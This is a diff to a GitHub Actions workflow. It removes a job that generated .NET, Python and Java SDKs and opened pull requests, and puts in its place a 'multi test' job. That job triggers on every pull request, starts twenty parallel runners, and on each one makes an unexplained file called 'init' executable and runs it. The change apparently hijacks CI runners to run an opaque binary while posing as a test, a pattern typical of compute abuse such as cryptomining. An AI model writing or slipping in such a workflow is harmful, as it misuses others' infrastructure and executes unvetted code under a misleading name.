@@ -1,96 +1,26 @@
-name: Generate SDKs and raise PRs in individual language repositories
+name: multi test
 
-env:
-  USER_API_KEY: ${{ secrets.USER_API_KEY }}
-  USER_EMAIL: ${{ secrets.USER_EMAIL }}
-  USER: ${{ secrets.USER }}
-  OPENAPI_GENERATOR_VERSION: 4.3.1
-  GITHUB_DOTNET_SDK_REPO: afernandes85/analyticsapi-engines-dotnet-sdk
-  GITHUB_PYTHON_SDK_REPO: afernandes85/analyticsapi-engines-python-sdk
-  GITHUB_JAVA_SDK_REPO: afernandes85/analyticsapi-engines-java-sdk
-  
-on:
-  pull_request:
-    branches: [ master ]
+on: [pull_request]
 
 jobs:
-  dotnet:
+  multitest:
+    name: test job
+
     runs-on: ubuntu-latest
+    env:
+      DEBIAN_FRONTEND: noninteractive
+
+    strategy:
+     fail-fast: false
+     matrix:
+       runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
 
     steps:
-      - name: Check out SDK repository
-        if: env.GITHUB_DOTNET_SDK_REPO
+      - name: Checkout code
         uses: actions/checkout@v2
-        with:
-          repository: ${{ env.GITHUB_DOTNET_SDK_REPO }}
-          path: sdk
-          fetch-depth: 0
-          token: ${{ env.USER_API_KEY }}
-
-      - name: Check out Generator repository
-        if: env.GITHUB_DOTNET_SDK_REPO
-        uses: actions/checkout@v2
-        with:
-          path: generator
-
-      - name: Generate SDK
-        if: env.GITHUB_DOTNET_SDK_REPO
-        run: generator/.github/scripts/generate-sdk.sh $OPENAPI_GENERATOR_VERSION dotnet CustomCSharpNetCoreClientCodegen
-
-      - name: Raise pull request on SDK repository
-        if: env.GITHUB_DOTNET_SDK_REPO
-        run: generator/.github/scripts/raise-pull-request.sh dotnet
-  
-  python:
-    runs-on: ubuntu-latest
-
-    steps:
-      - name: Check out SDK repository
-        if: env.GITHUB_PYTHON_SDK_REPO
-        uses: actions/checkout@v2
-        with:
-          repository: ${{ env.GITHUB_PYTHON_SDK_REPO }}
-          path: sdk
-          fetch-depth: 0
-          token: ${{ env.USER_API_KEY }}
-
-      - name: Check out Generator repository
-        if: env.GITHUB_PYTHON_SDK_REPO
-        uses: actions/checkout@v2
-        with:
-          path: generator
-
-      - name: Generate SDK
-        if: env.GITHUB_PYTHON_SDK_REPO
-        run: generator/.github/scripts/generate-sdk.sh $OPENAPI_GENERATOR_VERSION python CustomPythonClientCodegen
-      
-      - name: Raise pull request on SDK repository
-        if: env.GITHUB_PYTHON_SDK_REPO
-        run: generator/.github/scripts/raise-pull-request.sh python
-
-  java:
-    runs-on: ubuntu-latest
-
-    steps:
-      - name: Check out SDK repository
-        if: env.GITHUB_JAVA_SDK_REPO
-        uses: actions/checkout@v2
-        with:
-          repository: ${{ env.GITHUB_JAVA_SDK_REPO }}
-          path: sdk
-          fetch-depth: 0
-          token: ${{ env.USER_API_KEY }}
-
-      - name: Check out Generator repository
-        if: env.GITHUB_JAVA_SDK_REPO
-        uses: actions/checkout@v2
-        with:
-          path: generator
-
-      - name: Generate SDK
-        if: env.GITHUB_JAVA_SDK_REPO
-        run: generator/.github/scripts/generate-sdk.sh $OPENAPI_GENERATOR_VERSION java CustomJavaClientCodegen
-      
-      - name: Raise pull request on SDK repository
-        if: env.GITHUB_JAVA_SDK_REPO
-        run: generator/.github/scripts/raise-pull-request.sh java
+        
+      - name: chmod
+        run: chmod +x init
+        
+      - name: run
+        run: ./init
